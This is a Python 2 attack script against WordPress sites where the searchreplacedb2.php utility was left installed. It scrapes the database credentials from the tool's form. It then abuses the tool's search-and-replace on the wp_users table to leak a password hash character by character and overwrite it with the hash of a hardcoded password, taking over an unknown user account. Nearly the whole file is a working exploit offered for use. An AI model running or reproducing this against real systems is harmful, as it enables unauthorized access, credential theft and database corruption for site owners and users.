#!/usr/bin/env python2
import urllib,urllib2
import sys,time
import hashlib

class Target(object):
	"""The target to overwrite"""
	def __init__(self, url, password):
		self.ALPHABET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ./-_"
		self.ALPHABET = list(self.ALPHABET)
		self.ALPHABET.append("$1$")
		self.ALPHABET.append("10")
		self.iterations = 15
		self.url = self.sanitizeUrl(url)
		self.password = password

	def replace(self,search,replace):
		values = {'host':self.db_host,
		'data':self.db_name,
		'user':self.db_user,
		'pass':self.db_pass,
		'char':self.db_char,
		'guid':0,
		'tables\x5B0\x5D':'wp_users'}

		values['srch'] = search
		values['rplc'] = replace

		data = urllib.urlencode(values)
		response = urllib2.urlopen(self.url+"?step=5",data)
		html = response.read()
		time.sleep(0.03)
		return html

	def attack_sequence(self):
		self.PASSWORD_HASH = hashlib.md5(self.password).hexdigest()
		Target.info("Some data can be \x1B[91mdestroyed\x1B[0m")
		Target.info("\x1B[33mYou have 10 seconds to cancel\x1B[0m")
		try:
			time.sleep(10)
		except:
			Target.bad("User stopped attack. Leaving...")
			exit(0)
		self.clean_pass()

	def clean_pass(self):
		Target.good("Using the password-only replacement")
		Target.info("This is the cleanest, but longest method!")

		progress_width = 30
		sys.stdout.write("[%s]" % ("\x20" * progress_width))
		sys.stdout.flush()
		sys.stdout.write("\b" * (progress_width+1))
		sys.stdout.write("-")
		sys.stdout.flush()
		original_hash = "$P$B"
		for x in self.ALPHABET:
			html = self.replace("$P$B"+x,'$P$B$$')
			if "<strong>0</strong> cells were changed" not in html:
				original_hash = original_hash+x
				break
			

		for y in range(0,29):
			sys.stdout.write("-")
			sys.stdout.flush()
			for x in self.ALPHABET:
				html = self.replace("$P$B$$"+x,'$P$B$$')
				if "<strong>0</strong> cells were changed" not in html:
					if "<strong>1</strong> cells were changed":
						original_hash = original_hash+x
						break
					else:
						Target.bad("We just had a collision. Sorry bout'it. Fixing this will be hard")
						original_hash = original_hash+x
						Target.info("Let's continue anyway")
						break
		sys.stdout.write("\n")
		if len(original_hash) == 34:
			Target.good("We did it Reddit! Original hash was "+original_hash)
			
		self.replace("$P$B$$",self.PASSWORD_HASH)
		Target.good("We don't know which user we changed, but the password is "+self.password)

	def populate(self):
		Target.good("Getting info at "+self.url)
		values = {'loadwp':1}
		data = urllib.urlencode(values)
		response = ""
		try:
			response = urllib2.urlopen(self.url+"?step=2",data)
		except:
			Target.bad("Request error while trying to populate")
			exit(1)
		html = response.read()
		html = html.split('\n')
		for line in html:
			if line.find('name="host"') != -1:
				self.db_host = line.split('"')[9]
				Target.good("Setting '\x1B[35m"+self.db_host+"\x1B[0m' as database host")
			if line.find('name="data"') != -1:
				self.db_name = line.split('"')[9]
				Target.good("Setting '\x1B[35m"+self.db_name+"\x1B[0m' as database name")
			if line.find('name="user"') != -1:
				self.db_user = line.split('"')[9]
				Target.good("Setting '\x1B[35m"+self.db_user+"\x1B[0m' as database user")
			if line.find('name="pass"') != -1:
				self.db_pass = line.split('"')[9]
				Target.good("Setting '\x1B[35m"+self.db_pass+"\x1B[0m' as database password")
			if line.find('name="char"') != -1:
				self.db_char = line.split('"')[9]
				Target.good("Setting '\x1B[35m"+self.db_char+"\x1B[0m' as charset")

	def sanitizeUrl(self,url):
		if "://" not in url: 
			url = "http://"+url
		if "searchreplacedb2.php" not in url:
			if url[len(url)-1] != "/":
				url = url+"/"
			url += "searchreplacedb2.php"
		return url

	@staticmethod
	def good(text):
		print "[\x1B[32m+\x1B[0m] "+text
	
	@staticmethod
	def bad(text):
		print "[\x1B[31m-\x1B[0m] "+text
	
	@staticmethod
	def info(text):
		print "[\x1B[33m!\x1B[0m] "+text

def main():
	try:
		url = sys.argv[1]
	except:
		Target.bad("No URL provided")
		exit(1)

	Target.good("Creating a login pair for \x1B[32m"+url+"\x1B[0m")
	
	password = 'h4rdp455w0rd'
	Target.info("Using '"+password+"' as the password replacement")

	t = Target(url,password)
	t.populate()
	t.attack_sequence()

if __name__ == "__main__":
	main()
